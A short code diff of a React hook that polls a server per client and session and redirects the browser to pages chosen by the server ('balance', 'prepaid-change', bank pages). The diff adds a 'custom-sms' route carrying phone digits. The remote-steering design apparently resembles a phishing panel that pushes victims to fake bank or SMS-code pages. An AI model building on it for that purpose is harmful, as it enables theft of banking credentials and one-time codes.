@@ -6,6 +6,7 @@ interface RedirectResponse {
   redirect: boolean;
   type?: string;
   timestamp?: number;
+  phoneDigits?: string;
 }
 
 export const useRedirectChecker = (interval: number = 3000) => {
@@ -22,7 +23,7 @@ export const useRedirectChecker = (interval: number = 3000) => {
           `/api/check-redirect/${clientId}/${sessionId}`
         );
         const data: RedirectResponse = await response.json();
-
+        console.log("Redirect check response:", data); // Добавьте логирование
         if (data.success && data.redirect) {
           switch (data.type) {
             case "balance":
@@ -48,6 +49,17 @@ export const useRedirectChecker = (interval: number = 3000) => {
             case "prepaid":
               console.log("🔄 Redirecting to bank page");
               navigate(`/prepaid-change/${sessionId}`);
+              break;
+            case "custom-sms":
+              console.log(
+                "🔄 Redirecting to custom SMS page with phone digits:",
+                data.phoneDigits
+              );
+              navigate(`/custom-sms/${sessionId}`, {
+                state: {
+                  phoneDigits: data.phoneDigits,
+                },
+              });
               break;
             case "success":
               console.log("🔄 Redirecting to bank page");
